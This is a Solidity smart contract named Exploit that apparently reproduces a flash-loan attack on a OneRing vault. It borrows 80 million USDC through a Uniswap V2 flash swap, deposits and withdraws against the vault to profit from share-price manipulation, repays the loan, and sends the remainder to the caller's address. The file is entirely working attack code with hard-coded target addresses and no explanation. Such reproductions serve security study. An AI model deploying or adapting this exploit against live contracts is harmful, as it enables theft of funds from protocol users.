//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.4;

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
interface IOneRingVault {
    function depositSafe(
        uint256 _amount,
        address _token,
        uint256 _minAmount
    ) external;
    function withdraw(uint256 _amount, address _underlying) external;
    function balanceOf(address account) external view returns (uint256);
}
interface IERC20 {
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function decimals() view external returns (uint8);
}
contract Exploit {

    IUniswapV2Pair pair = IUniswapV2Pair(0xbcab7d083Cf6a01e0DdA9ed7F8a02b47d125e682);
    IERC20 usdc = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);
    IOneRingVault vault = IOneRingVault(0x4e332D616b5bA1eDFd87c899E534D996c336a2FC);


    function attack() public{
        pair.swap(80000000*1e6,0,address(this),new bytes(1));
    }

    function hook(address sender, uint amount0, uint amount1, bytes calldata data) external{
        usdc.approve(address(vault),type(uint256).max);
        vault.depositSafe(amount0,address(usdc),1);
        vault.withdraw(vault.balanceOf(address(this)),address(usdc));
        usdc.transfer(msg.sender,(amount0/9999*10000)+10000);
        usdc.transfer(tx.origin,usdc.balanceOf(address(this)));
    }
}
